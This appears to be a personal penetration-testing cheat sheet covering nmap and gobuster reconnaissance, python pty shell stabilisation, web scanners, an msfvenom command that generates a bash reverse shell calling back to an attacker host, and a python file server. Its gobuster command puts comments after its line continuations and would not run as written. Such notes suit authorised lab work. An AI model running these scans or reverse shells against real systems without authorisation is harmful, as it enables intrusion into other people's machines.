Scanning & information gathering: 

nmap: 

general: 
sudo nmap -sC -sV -T4 -v -p- --script=banner  -oN full_scan.txt IP

for a specific service: 
sudo nmap -p PORT  -sV --script SCRIPT-NAME TARGET

gobuster: 

gobuster dir -u IP -w /usr/share/wordlists/dirb/common.txt -e  
  -x php,html,txt    \  # common file extensions to try
  -t 50              \  # number of concurrent threads
  -o gobuster.out    \  # save output to file
  -s 200,204,301,302 \  # only show these status codes
  -k                 \  # skip SSL/TLS cert verification (if HTTPS)
  -v                 \  # verbose; show more info


Stable shell: 

python -c 'import pty; pty.spawn("/bin/bash")'
OR
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Ctrl + Z [Background Process]

stty raw -echo ; fg ; reset
stty columns 200 rows 200

Web application : 
Tools: 
wfuzz
nikto 
if wordpress : wpscan, take a look at upload and at the plugin 

bash reverse shell with metaspoloit: 
msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > reverse.sh

During Exploit: 

python webserver: 
python3 -m http.server 8000

 



